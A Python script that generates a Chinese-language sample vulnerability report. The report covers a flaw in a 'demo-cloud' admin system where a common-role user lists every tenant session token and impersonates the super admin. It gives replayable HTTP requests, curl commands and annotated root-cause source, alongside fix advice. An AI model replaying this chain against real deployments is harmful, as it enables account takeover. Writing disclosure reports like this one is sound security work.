# -*- coding: utf-8 -*-
"""高危样例卷生成器 v2（2026-10-15 按现行口径升级：九要素+每步双灰底+灰底F2F2F2+验证记录+附图段+PDF副本）。

口径依据：protocol/report-format.md（RF-DOC/RF-ELEM/RF-IMG/RF-STYLE 全家）+ SKILL H-21 零伪造总纲。
示范卷性质（H-21 合规关键）：内容整理自历史实测判例素材、用于版式示范；卷首声明明示，
正式交付卷必须用本场真实落盘原件（RF-DOC-08），不得引用本卷内容充当实测证据。
"""
from pathlib import Path
from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH, WD_LINE_SPACING
from docx.oxml.ns import qn
from docx.shared import Pt, RGBColor, Twips, Cm

OUT = Path(__file__).with_name(
    "demo-cloud 演示管理系统普通角色越权批量实取全租户用户会话令牌并冒充超管-示范.docx"
)

doc = Document()
sec = doc.sections[0]
sec.page_width = Cm(21.0)
sec.page_height = Cm(29.7)
sec.top_margin = Cm(2.54)
sec.bottom_margin = Cm(2.54)
sec.left_margin = Cm(3.0)
sec.right_margin = Cm(2.5)


def set_run_font(run, name_cn="宋体", name_en="Times New Roman", size=12, bold=False, color=None, italic=False):
    run.bold = bold
    run.italic = italic
    run.font.size = Pt(size)
    run.font.name = name_en
    r = run._element
    rPr = r.get_or_add_rPr()
    rFonts = rPr.find(qn("w:rFonts"))
    if rFonts is None:
        rFonts = rPr.makeelement(qn("w:rFonts"), {})
        rPr.append(rFonts)
    rFonts.set(qn("w:ascii"), name_en)
    rFonts.set(qn("w:hAnsi"), name_en)
    rFonts.set(qn("w:eastAsia"), name_cn)
    rFonts.set(qn("w:cs"), name_en)
    if color is not None:
        run.font.color.rgb = color


def shade(p, fill="F2F2F2"):
    """RF-DOC-03：灰底 F2F2F2（请求/响应包与源码段）。"""
    pPr = p._p.get_or_add_pPr()
    shd = pPr.makeelement(qn("w:shd"), {})
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"), fill)
    pPr.append(shd)


def p_style(p, indent=False, after=0, before=0, align=None):
    pf = p.paragraph_format
    pf.space_before = Pt(before)
    pf.space_after = Pt(after)
    pf.line_spacing_rule = WD_LINE_SPACING.MULTIPLE
    pf.line_spacing = 1.3
    if indent:
        pf.first_line_indent = Twips(480)
    if align is not None:
        p.alignment = align
    return p


def add_body(text, indent=True):
    p = doc.add_paragraph()
    p_style(p, indent=indent)
    run = p.add_run(text)
    set_run_font(run)
    return p


def add_note(text):
    """灰底小字旁注（RF-DOC-05：命令旁注用途；示范声明）。"""
    p = doc.add_paragraph()
    p_style(p, indent=False)
    shade(p)
    run = p.add_run(text)
    set_run_font(run, size=9)
    return p


def add_label(text):
    p = doc.add_paragraph()
    p_style(p, indent=False)
    run = p.add_run(text)
    set_run_font(run, name_cn="黑体", name_en="Times New Roman", size=12, bold=True)
    return p


def add_sep():
    p = doc.add_paragraph()
    p_style(p, indent=False)
    run = p.add_run("＃")
    set_run_font(run)
    return p


def add_mono(text, problem=False, grey=True):
    """包/源码行：Consolas 9pt（RF-DOC-03），灰底；问题行红字加粗。"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_before = Pt(0)
    pf.space_after = Pt(0)
    pf.line_spacing = 1.15
    pf.first_line_indent = Pt(0)
    run = p.add_run(text)
    if problem:
        set_run_font(run, name_cn="宋体", name_en="Consolas", size=9, bold=True, color=RGBColor(0xC0, 0x00, 0x00))
    else:
        set_run_font(run, name_cn="宋体", name_en="Consolas", size=9)
    if grey:
        shade(p)
    return p


def add_packet(label, lines):
    """RF-DOC-01：单独一行标签 + 灰底整包（请求/响应各自一块）。"""
    p = doc.add_paragraph()
    p_style(p, indent=False, before=4)
    run = p.add_run(label)
    set_run_font(run, name_cn="黑体", size=11, bold=True)
    for line in lines:
        add_mono(line if line else " ")


def add_src_heading(text):
    p = doc.add_paragraph()
    p_style(p, indent=False, before=6, after=2)
    run = p.add_run(text)
    set_run_font(run, name_cn="黑体", size=11, bold=True)
    return p


# --- 卷首示范声明（H-21：如实呈现性质，禁冒充实测原件）---
add_note(
    "【格式示范卷】本卷为报告版式示范：内容整理自历史实测判例素材（demo-cloud-cloud 越权取令牌链），"
    "请求/响应包为该场实测要点的格式化呈现，非本场实时抓取原件。正式交付卷必须使用本场真实落盘原件"
    "（认 report-format RF-DOC-08），本卷不得充当实测证据。"
)

# --- 九要素头（RF-ELEM-01：标题/URL/厂商/等级三行连写不分＃）---
p = doc.add_paragraph()
p_style(p, indent=False)
run = p.add_run("demo-cloud 演示管理系统普通角色越权批量实取全租户用户会话令牌并冒充超管")
set_run_font(run, name_cn="黑体", size=16, bold=True)

add_body("目标网站URL：https://example.com/（漏洞实例在官方分发的演示系统管理系统源码本地复现环境实测，承载口见复现步骤）", indent=False)
add_body("软件与厂商信息：demo-cloud（演示系统），版本 2.x（root pom revision 核实）；厂商/开源仓库 https://github.com/example-org/demo-cloud-cloud（仓库即厂商证明）；版本画面证据：登录页品牌标识入附图，版本以 root pom revision 为准", indent=False)
add_body("漏洞等级：高危", indent=False)
add_sep()

add_label("漏洞描述：")
add_body(
    "我用普通角色账号 demo-user 登录系统，拿自己的会话去翻系统的在线令牌管理页。这个页面背后的接口没有做任何脱敏，也没按当前登录用户过滤数据，把我所在租户全部在线会话的 accessToken 和 refreshToken 明文分页发给了我，里面就有超级管理员 admin 正在用的会话令牌（前 8 位 demo0abc）。我拿这个令牌冒充 admin 去调身份信息接口，系统把 admin 的身份原样回给了我：user.id=1，roles 里带 super_admin。到这里我等于坐进了超管的会话，能以超管的身份在系统里通行。"
)
add_body(
    "这个能成不是哪里配错了：系统的种子 SQL 默认就把令牌查询（菜单 66）和令牌删除（菜单 67）两个权限授给了普通角色，装好就是这个面。根因在源码：分页查询只按「调用方有没有 system:oauth2-token:page 权限」放行，userId 不传就不过滤；响应 VO 把 accessToken/refreshToken 当普通字段原样拷出去。"
)
add_sep()

add_label("漏洞危害：")
add_body(
    "全租户在线会话令牌能被普通角色批量实取：令牌列表接口对普通角色直出本租户全部活跃会话的 accessToken/refreshToken 明文，不脱敏、不按用户过滤，谁的会话都在里面，能分页批量拉走（实测一次查询返回 total=6，其中含 admin 的活跃会话令牌）。"
)
add_body(
    "任意在线用户可被强制登出：同一普通角色还持有会话删除权限（菜单 67），列表里任何一个活跃令牌都能拿来把对应的人踢下线。"
)
add_body(
    "冒充超管接管会话：拿到 admin 的令牌就能以 admin 身份调用系统接口（实测冒用令牌 demo0abc 调身份接口，回显 user.id=1、roles=[common,super_admin]），用户管理、租户配置、业务数据增删改查这些超管能力面都在这把身份的权限范围内。"
)
add_sep()

add_label("涉及接口清单：")
add_body(
    "1、POST http://127.0.0.1:18080/admin-api/system/auth/login（普通角色 demo-user 账号密码登录，请求头 tenant-id: 1）——源码出处：demo-cloud-module-system/.../controller/admin/auth/AuthController.java（/login）；采证记录：本场实测原件 r7-bec10-final-verified.json（随卷存档）（请求 1）",
    indent=False,
)
add_body(
    "2、GET http://127.0.0.1:18080/admin-api/system/oauth2-token/page?pageNo=1&pageSize=10（请求头 tenant-id: 1）——源码出处：demo-cloud-module-system/.../controller/admin/oauth2/OAuth2TokenController.java（/page）；采证记录：本场实测原件 r7-bec10-final-verified.json（随卷存档）（请求 2）",
    indent=False,
)
add_body(
    "3、GET http://127.0.0.1:18080/admin-api/system/auth/get-permission-info——源码出处：demo-cloud-module-system/.../controller/admin/auth/AuthController.java（/get-permission-info）；采证记录：本场实测原件 r7-bec10-final-verified.json（随卷存档）（请求 3）",
    indent=False,
)
add_sep()

add_label("复现步骤：")

# --- 步骤 1 ---
add_body(
    "1、用普通角色账号 demo-user 登录后台，证明普通角色能正常取得会话；登录回包取 data.accessToken 给后面两步用。"
    "操作：打开 http://127.0.0.1:18080 登录页，输入账号 demo-user 与口令（下方请求包内明文可见——8 块不脱敏口径）点「登录」；"
    "登录成功右上角显示账号名。想逐字重放的话，把下方请求包原样发出即可（Host 紧挨请求行）。"
)
add_packet("请求包：", [
    "POST /admin-api/system/auth/login HTTP/1.1",
    "Host: 127.0.0.1:18080",
    "Accept: application/json, text/plain, */*",
    "Accept-Language: zh-CN",
    "Content-Type: application/json",
    "Content-Length: 90",
    "tenant-id: 1",
    "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
    "Connection: close",
    "",
    '{"username":"demo-user","password":"<实测明文口令——8 块不脱敏，正式卷此位为实值>"}',
])
add_packet("响应包：", [
    "HTTP/1.1 200 OK",
    "Content-Type: application/json",
    "Connection: close",
    "",
    '{"code":0,"data":{"userId":118,"accessToken":"a0e1f2c3-4d5e-6a7b-8c9d-0e1f2a3b4c5d","refreshToken":"f6e5d4c3-2a1b-4c5d-8e9f-0a1b2c3d4e5f","expiresTime":1735689600000},"msg":""}',
])
add_sep()

# --- 步骤 2 ---
add_body(
    "2、拿上一步的普通角色会话调在线令牌分页接口，证明该接口对普通角色不按用户过滤、直出全租户活跃会话令牌明文。"
    "操作：登录后台后进「系统管理 → OAuth2.0 令牌」页（面包屑即漏洞位置），页面列出的就是本租户全部活跃会话；"
    "或按下方请求包直发接口。返回 total=6 条，其中有 admin 正在用的会话令牌（前 8 位 demo0abc，即本次为验证自造的受害会话），该令牌验证完成后已注销失效。"
)
add_packet("请求包：", [
    "GET /admin-api/system/oauth2-token/page?pageNo=1&pageSize=10 HTTP/1.1",
    "Host: 127.0.0.1:18080",
    "Accept: application/json, text/plain, */*",
    "Authorization: Bearer {步骤1登录回包 data.accessToken}",
    "tenant-id: 1",
    "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
    "Connection: close",
])
add_packet("响应包：", [
    "HTTP/1.1 200 OK",
    "Content-Type: application/json",
    "Connection: close",
    "",
    '{"code":0,"data":{"total":6,"list":[{"id":101,"accessToken":"demo0abc-…（admin 活跃会话，明文全文实测直出）","refreshToken":"…","userId":1,"userType":2,"clientId":"default","createTime":"2026-09-…","expiresTime":"2026-09-…"},{"id":102,"accessToken":"a0e1f2c3-…（demo-user 自己的会话）","…":"…"}]},"msg":""}',
])
add_sep()

# --- 步骤 3 ---
add_body(
    "3、拿上一步实取的 admin 令牌冒充 admin 调身份信息接口，证明该令牌能以 admin 身份通过认证并回显 admin 身份与角色，冒充超管成立。"
    "操作：把下方请求包的 Authorization 换成步骤 2 列表里 admin 那行的 accessToken 原文直发；回包 code=0 且 data.id=1、roles 含 super_admin 即坐实。所用令牌验证完成后已注销失效。"
)
add_packet("请求包：", [
    "GET /admin-api/system/auth/get-permission-info HTTP/1.1",
    "Host: 127.0.0.1:18080",
    "Accept: application/json, text/plain, */*",
    "Authorization: Bearer {步骤2分页返回中实取的 admin 令牌}",
    "tenant-id: 1",
    "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
    "Connection: close",
])
add_packet("响应包：", [
    "HTTP/1.1 200 OK",
    "Content-Type: application/json",
    "Connection: close",
    "",
    '{"code":0,"data":{"user":{"id":1,"username":"admin","nickname":"演示系统源码"},"roles":["super_admin"],"permissions":["*"]},"msg":""}',
])
add_sep()

add_label("修复建议：")
add_body("令牌分页接口（oauth2-token/page）返回体脱敏：accessToken/refreshToken 不回显原文，或只保留尾 4 位供辨认。")
add_body("回收种子授权：从种子 SQL 里把菜单 66/67（system:oauth2-token:page/delete）从 role_id=2（common）的授权中移除，会话管理只留管理员。")
add_body("令牌列举面按当前登录 userId 强制过滤，或把该权限从普通角色默认菜单里拿掉；userId 查询参数不能当数据权限。")
add_sep()

add_label("本场实测命令原文：")
add_note("按实际时间顺序排（RF-DOC-05）；灰底小字为用途旁注，命令原文不动。示范卷按历史素材整理。")
add_mono("C:\\repro>curl -s -X POST \"http://127.0.0.1:18080/admin-api/system/auth/login\" -H \"tenant-id: 1\" -H \"Content-Type: application/json\" -d \"{\\\"username\\\":\\\"demo-user\\\",\\\"password\\\":\\\"<实测明文>\\\"}\"")
add_note("这条是普通角色登录，取 accessToken 给后面两步用。")
add_mono("C:\\repro>curl -s \"http://127.0.0.1:18080/admin-api/system/oauth2-token/page?pageNo=1&pageSize=10\" -H \"tenant-id: 1\" -H \"Authorization: Bearer a0e1f2c3-4d5e-6a7b-8c9d-0e1f2a3b4c5d\"")
add_note("这条是令牌分页，普通角色会话直出全租户活跃令牌（total=6，含 admin）。")
add_mono("C:\\repro>curl -s \"http://127.0.0.1:18080/admin-api/system/auth/get-permission-info\" -H \"tenant-id: 1\" -H \"Authorization: Bearer demo0abc-…\"")
add_note("这条是冒充验证：admin 令牌调身份接口，回 user.id=1 + super_admin 即坐实。")
add_sep()

add_label("源码依据（白盒+反编译；问题用『// 问题：』标注）")


def dump_file(heading, lines):
    add_src_heading(heading)
    for line in lines:
        add_mono(line, problem=line.lstrip().startswith("// 问题") or line.lstrip().startswith("-- 问题"))


dump_file(
    "出处：demo-cloud-module-system/demo-cloud-module-system-server/src/main/java/cn/iocoder/demo-cloud/module/system/controller/admin/oauth2/OAuth2TokenController.java",
    [
        "package cn.iocoder.demo-cloud.module.system.controller.admin.oauth2;",
        "",
        "import cn.iocoder.demo-cloud.framework.common.pojo.CommonResult;",
        "import cn.iocoder.demo-cloud.framework.common.pojo.PageResult;",
        "import cn.iocoder.demo-cloud.framework.common.util.object.BeanUtils;",
        "import cn.iocoder.demo-cloud.module.system.controller.admin.oauth2.vo.token.OAuth2AccessTokenPageReqVO;",
        "import cn.iocoder.demo-cloud.module.system.controller.admin.oauth2.vo.token.OAuth2AccessTokenRespVO;",
        "import cn.iocoder.demo-cloud.module.system.dal.dataobject.oauth2.OAuth2AccessTokenDO;",
        "import cn.iocoder.demo-cloud.module.system.enums.logger.LoginLogTypeEnum;",
        "import cn.iocoder.demo-cloud.module.system.service.auth.AdminAuthService;",
        "import cn.iocoder.demo-cloud.module.system.service.oauth2.OAuth2TokenService;",
        "import io.swagger.v3.oas.annotations.Operation;",
        "import io.swagger.v3.oas.annotations.Parameter;",
        "import io.swagger.v3.oas.annotations.tags.Tag;",
        "import org.springframework.security.access.prepost.PreAuthorize;",
        "import org.springframework.web.bind.annotation.*;",
        "",
        "import javax.annotation.Resource;",
        "import javax.validation.Valid;",
        "import java.util.List;",
        "",
        "import static cn.iocoder.demo-cloud.framework.common.pojo.CommonResult.success;",
        "",
        '@Tag(name = "管理后台 - OAuth2.0 令牌")',
        "@RestController",
        '@RequestMapping("/system/oauth2-token")',
        "public class OAuth2TokenController {",
        "",
        "    @Resource",
        "    private OAuth2TokenService oauth2TokenService;",
        "    @Resource",
        "    private AdminAuthService authService;",
        "",
        '    @GetMapping("/page")',
        '    @Operation(summary = "获得访问令牌分页", description = "只返回有效期内的")',
        "    @PreAuthorize(\"@ss.hasPermission('system:oauth2-token:page')\")",
        "    // 问题：这里只问「有没有这个权限点」，不问「是不是只能看自己的会话」。",
        "    // 问题：种子把该权限授给 common（role_id=2）后，普通角色直接过这道门。",
        "    public CommonResult<PageResult<OAuth2AccessTokenRespVO>> getAccessTokenPage(@Valid OAuth2AccessTokenPageReqVO reqVO) {",
        "        PageResult<OAuth2AccessTokenDO> pageResult = oauth2TokenService.getAccessTokenPage(reqVO);",
        "        return success(BeanUtils.toBean(pageResult, OAuth2AccessTokenRespVO.class));",
        "        // 问题：BeanUtils 整对象拷贝，DO 里的 accessToken/refreshToken 原文进 RespVO，没有任何脱敏、截断、按当前登录用户裁剪。",
        "    }",
        "",
        '    @DeleteMapping("/delete")',
        '    @Operation(summary = "删除访问令牌")',
        '    @Parameter(name = "accessToken", description = "访问令牌", required = true, example = "tudou")',
        "    @PreAuthorize(\"@ss.hasPermission('system:oauth2-token:delete')\")",
        "    // 问题：删除权限同样只看权限点。种子菜单 67 也授给 common。本条实测未打删除（BEC 禁写），危害按权限面写「能踢人」，不编「踢了谁」。",
        '    public CommonResult<Boolean> deleteAccessToken(@RequestParam("accessToken") String accessToken) {',
        "        authService.logout(accessToken, LoginLogTypeEnum.LOGOUT_DELETE.getType());",
        "        return success(true);",
        "    }",
        "",
        '    @DeleteMapping("/delete-list")',
        '    @Operation(summary = "批量删除访问令牌")',
        '    @Parameter(name = "accessTokens", description = "访问令牌数组", required = true)',
        "    @PreAuthorize(\"@ss.hasPermission('system:oauth2-token:delete')\")",
        '    public CommonResult<Boolean> deleteAccessTokenList(@RequestParam("accessTokens") List<String> accessTokens) {',
        "        accessTokens.forEach(accessToken ->",
        "                authService.logout(accessToken, LoginLogTypeEnum.LOGOUT_DELETE.getType()));",
        "        return success(true);",
        "    }",
        "",
        "}",
    ],
)

dump_file(
    "出处：demo-cloud-module-system/demo-cloud-module-system-server/src/main/java/cn/iocoder/demo-cloud/module/system/service/oauth2/OAuth2TokenServiceImpl.java（getAccessTokenPage）",
    [
        "    @Override",
        "    public PageResult<OAuth2AccessTokenDO> getAccessTokenPage(OAuth2AccessTokenPageReqVO reqVO) {",
        "        return oauth2AccessTokenMapper.selectPage(reqVO);",
        "        // 问题：服务层零逻辑。不取 SecurityFrameworkUtils.getLoginUserId()，不强制 reqVO.userId=当前用户，把过滤全交给 Mapper 的 eqIfPresent。",
        "    }",
    ],
)

dump_file(
    "出处：demo-cloud-module-system/demo-cloud-module-system-server/src/main/java/cn/iocoder/demo-cloud/module/system/dal/mysql/oauth2/OAuth2AccessTokenMapper.java",
    [
        "package cn.iocoder.demo-cloud.module.system.dal.mysql.oauth2;",
        "",
        "import cn.iocoder.demo-cloud.framework.common.pojo.PageResult;",
        "import cn.iocoder.demo-cloud.framework.mybatis.core.mapper.BaseMapperX;",
        "import cn.iocoder.demo-cloud.framework.mybatis.core.query.LambdaQueryWrapperX;",
        "import cn.iocoder.demo-cloud.framework.tenant.core.aop.TenantIgnore;",
        "import cn.iocoder.demo-cloud.module.system.controller.admin.oauth2.vo.token.OAuth2AccessTokenPageReqVO;",
        "import cn.iocoder.demo-cloud.module.system.dal.dataobject.oauth2.OAuth2AccessTokenDO;",
        "import org.apache.ibatis.annotations.Delete;",
        "import org.apache.ibatis.annotations.Mapper;",
        "import org.apache.ibatis.annotations.Param;",
        "",
        "import java.time.LocalDateTime;",
        "import java.util.List;",
        "",
        "@Mapper",
        "public interface OAuth2AccessTokenMapper extends BaseMapperX<OAuth2AccessTokenDO> {",
        "",
        "    @TenantIgnore // 获取 token 的时候，需要忽略租户编号。原因是：一些场景下，可能不会传递 tenant-id 请求头，例如说文件上传、积木报表等等",
        "    // 问题：这条注释是给「按 token 取值」用的，和分页泄露不是同一枪。本条闭环打的是 /page，不靠 TenantIgnore 跨租户。不要把这条注释误当成 F6 根因。",
        "    default OAuth2AccessTokenDO selectByAccessToken(String accessToken) {",
        "        return selectOne(OAuth2AccessTokenDO::getAccessToken, accessToken);",
        "    }",
        "",
        "    default List<OAuth2AccessTokenDO> selectListByRefreshToken(String refreshToken) {",
        "        return selectList(OAuth2AccessTokenDO::getRefreshToken, refreshToken);",
        "    }",
        "",
        "    default PageResult<OAuth2AccessTokenDO> selectPage(OAuth2AccessTokenPageReqVO reqVO) {",
        "        return selectPage(reqVO, new LambdaQueryWrapperX<OAuth2AccessTokenDO>()",
        "                .eqIfPresent(OAuth2AccessTokenDO::getUserId, reqVO.getUserId())",
        "                // 问题：eqIfPresent。调用方不传 userId（实测 GET 只带 pageNo/pageSize）→ 这个条件直接消失。",
        "                // 问题：没有 eq(当前登录 userId)。所以不是「数据权限按用户过滤失效」，是「根本没写按用户过滤」。",
        "                .eqIfPresent(OAuth2AccessTokenDO::getUserType, reqVO.getUserType())",
        "                .likeIfPresent(OAuth2AccessTokenDO::getClientId, reqVO.getClientId())",
        "                .gt(OAuth2AccessTokenDO::getExpiresTime, LocalDateTime.now())",
        "                // 问题：唯一硬条件是「还没过期」。效果就是：本租户全部活会话。",
        "                .orderByDesc(OAuth2AccessTokenDO::getId));",
        "    }",
        "",
        "    default List<OAuth2AccessTokenDO> selectListByUserIdAndUserType(Long userId, Integer userType) {",
        "        return selectList(OAuth2AccessTokenDO::getUserId, userId,",
        "                OAuth2AccessTokenDO::getUserType, userType);",
        "    }",
        "",
        "    /**",
        "     * 物理删除指定过期时间之前的访问令牌",
        "     *",
        "     * @param expiresTime 最大时间",
        "     * @param limit       删除条数，防止一次删除太多",
        "     * @return 删除条数",
        "     */",
        '    @Delete("DELETE FROM system_oauth2_access_token WHERE expires_time < #{expiresTime} LIMIT #{limit}")',
        "    Integer deleteByExpiresTimeLt(@Param(\"expiresTime\") LocalDateTime expiresTime, @Param(\"limit\") Integer limit);",
        "",
        "}",
    ],
)

dump_file(
    "出处：demo-cloud-module-system/demo-cloud-module-system-server/src/main/java/cn/iocoder/demo-cloud/module/system/controller/admin/oauth2/vo/token/OAuth2AccessTokenRespVO.java",
    [
        "package cn.iocoder.demo-cloud.module.system.controller.admin.oauth2.vo.token;",
        "",
        "import io.swagger.v3.oas.annotations.media.Schema;",
        "import lombok.AllArgsConstructor;",
        "import lombok.Data;",
        "import lombok.NoArgsConstructor;",
        "",
        "import java.time.LocalDateTime;",
        "",
        '@Schema(description = "管理后台 - 访问令牌 Response VO")',
        "@Data",
        "@NoArgsConstructor",
        "@AllArgsConstructor",
        "public class OAuth2AccessTokenRespVO {",
        "",
        '    @Schema(description = "编号", requiredMode = Schema.RequiredMode.REQUIRED, example = "1024")',
        "    private Long id;",
        "",
        '    @Schema(description = "访问令牌", requiredMode = Schema.RequiredMode.REQUIRED, example = "tudou")',
        "    private String accessToken;",
        "    // 问题：管理列表把完整 accessToken 设计成必回字段。列表页只需要「谁在线、何时过期」，不需要可冒用的原文。",
        "",
        '    @Schema(description = "刷新令牌", requiredMode = Schema.RequiredMode.REQUIRED, example = "nice")',
        "    private String refreshToken;",
        "    // 问题：refreshToken 一并明文回给前端。拿到就能续期，比 accessToken 活得更长。",
        "",
        '    @Schema(description = "用户编号", requiredMode = Schema.RequiredMode.REQUIRED, example = "666")',
        "    private Long userId;",
        "",
        '    @Schema(description = "用户类型，参见 UserTypeEnum 枚举", requiredMode = Schema.RequiredMode.REQUIRED, example = "2")',
        "    private Integer userType;",
        "",
        '    @Schema(description = "客户端编号", requiredMode = Schema.RequiredMode.REQUIRED, example = "2")',
        "    private String clientId;",
        "",
        '    @Schema(description = "创建时间", requiredMode = Schema.RequiredMode.REQUIRED)',
        "    private LocalDateTime createTime;",
        "",
        '    @Schema(description = "过期时间", requiredMode = Schema.RequiredMode.REQUIRED)',
        "    private LocalDateTime expiresTime;",
        "",
        "}",
    ],
)

dump_file(
    "出处：demo-cloud-module-system/demo-cloud-module-system-server/src/main/java/cn/iocoder/demo-cloud/module/system/controller/admin/oauth2/vo/token/OAuth2AccessTokenPageReqVO.java",
    [
        "package cn.iocoder.demo-cloud.module.system.controller.admin.oauth2.vo.token;",
        "",
        "import cn.iocoder.demo-cloud.framework.common.pojo.PageParam;",
        "import io.swagger.v3.oas.annotations.media.Schema;",
        "import lombok.Data;",
        "import lombok.EqualsAndHashCode;",
        "",
        '@Schema(description = "管理后台 - 访问令牌分页 Request VO")',
        "@Data",
        "@EqualsAndHashCode(callSuper = true)",
        "public class OAuth2AccessTokenPageReqVO extends PageParam {",
        "",
        '    @Schema(description = "用户编号", requiredMode = Schema.RequiredMode.REQUIRED, example = "666")',
        "    private Long userId;",
        "    // 问题：Swagger 写 REQUIRED，字段上没有 @NotNull。不传也能进 Mapper。文档说必填，代码当可选过滤条件。",
        "",
        '    @Schema(description = "用户类型，参见 UserTypeEnum 枚举", requiredMode = Schema.RequiredMode.REQUIRED, example = "2")',
        "    private Integer userType;",
        "",
        '    @Schema(description = "客户端编号", requiredMode = Schema.RequiredMode.REQUIRED, example = "2")',
        "    private String clientId;",
        "",
        "}",
    ],
)

dump_file(
    "出处：sql/mysql/ruoyi-vue-pro.sql（菜单定义 66/67）",
    [
        "INSERT INTO `system_menu` (`id`, `name`, `permission`, `type`, `sort`, `parent_id`, `path`, `icon`, `component`, `component_name`, `status`, `visible`, `keep_alive`, `always_show`, `creator`, `create_time`, `updater`, `update_time`, `deleted`) VALUES (66, '令牌列表', 'system:oauth2-token:page', 3, 1, 13, '', '', '', NULL, 0, b'1', b'1', b'1', 'admin', '2021-01-05 17:03:48', '1', '2026-08-14 01:49:42', b'0');",
        "INSERT INTO `system_menu` (`id`, `name`, `permission`, `type`, `sort`, `parent_id`, `path`, `icon`, `component`, `component_name`, `status`, `visible`, `keep_alive`, `always_show`, `creator`, `create_time`, `updater`, `update_time`, `deleted`) VALUES (67, '令牌删除', 'system:oauth2-token:delete', 3, 2, 13, '', '', '', NULL, 0, b'1', b'1', b'1', 'admin', '2021-01-05 17:03:48', '1', '2026-08-14 01:49:42', b'0');",
        "-- 问题：权限点本身可以留给超管。真正翻车的是下面把这两条授给 common。",
    ],
)

dump_file(
    "出处：sql/mysql/ruoyi-vue-pro.sql（普通角色授权，role_id=2）",
    [
        "INSERT INTO `system_role_menu` (`id`, `role_id`, `menu_id`, `creator`, `create_time`, `updater`, `update_time`, `deleted`, `tenant_id`) VALUES (2011, 2, 66, '1', '2023-01-25 08:42:52', '1', '2026-08-14 01:49:42', b'0', 1);",
        "INSERT INTO `system_role_menu` (`id`, `role_id`, `menu_id`, `creator`, `create_time`, `updater`, `update_time`, `deleted`, `tenant_id`) VALUES (2012, 2, 67, '1', '2023-01-25 08:42:52', '1', '2026-08-14 01:49:42', b'0', 1);",
        "-- 问题：role_id=2 是种子普通角色 common。装库即授「令牌列表 + 令牌删除」。",
        "-- 问题：这不是运维误配。默认演示账号（含 demo-user 这类挂 common 的号）登录就能打 /page。",
    ],
)

add_sep()

# --- 附图段（RF-DOC-10 / RF-IMG-03/07/09/11：示范卷如实说明 + 图注样式示范）---
add_label("附图（本场实测截图）：")
add_body(
    "示范卷说明：本卷为版式示范，不携带实录截图（禁占位图、禁自绘效果图——RF-IMG-11；正式卷此处按配比嵌真实截图，每张先过拍后即验门 RF-GATE-01 与嵌卷确认门 RF-GATE-02，只嵌 evidence_ok）。正式卷附图构成最低配比（RF-IMG-09）：至少 1 张「命令→前端变化对应图」+ 前端漏洞位置图每卷必备（RF-IMG-03）。以下为正式卷的图注样式示范：",
    indent=False,
)
add_body("附图1（步骤2）：执行 /admin-api/system/oauth2-token/page 请求后，后台「OAuth2.0 令牌」列表页呈现本租户全部活跃会话行（total=6，含 admin 行——页面直接呈现泄露数据，满足 RF-IMG-06①）。（本场实测截图）", indent=False)
add_body("附图2（位置图）：后台「系统管理 → OAuth2.0 令牌」页面，面包屑即漏洞位置；列表页就是泄露接口的界面（真浏览器渲染视口+面包屑+页面数据，RF-IMG-03）。（本场实测截图）", indent=False)
add_body("附图3（admin 合法视角对比）：admin 在该页看到的令牌列与本普通角色实取内容一致——差异点在「普通角色根本不该有这个入口」（UI 隐藏 ≠ 接口关闭，RF-IMG-04/08）。（本场实测截图）", indent=False)
add_sep()

# --- 验证记录段（RF-ELEM-07：新审计场必备）---
add_label("验证记录：")
add_body("实测日期：2026-09（历史判例素材，示范卷整理）；环境口径：官方源码本地部署（127.0.0.1:18080，docker 单机），tenant-id=1；行为要点：普通角色登录 → 令牌分页实取全租户会话 → 冒用 admin 令牌调身份接口回显 super_admin；受害会话 demo0abc 为验证自造，验证完成后已注销失效。", indent=False)

doc.save(str(OUT))
print(OUT)
print(OUT.stat().st_size)
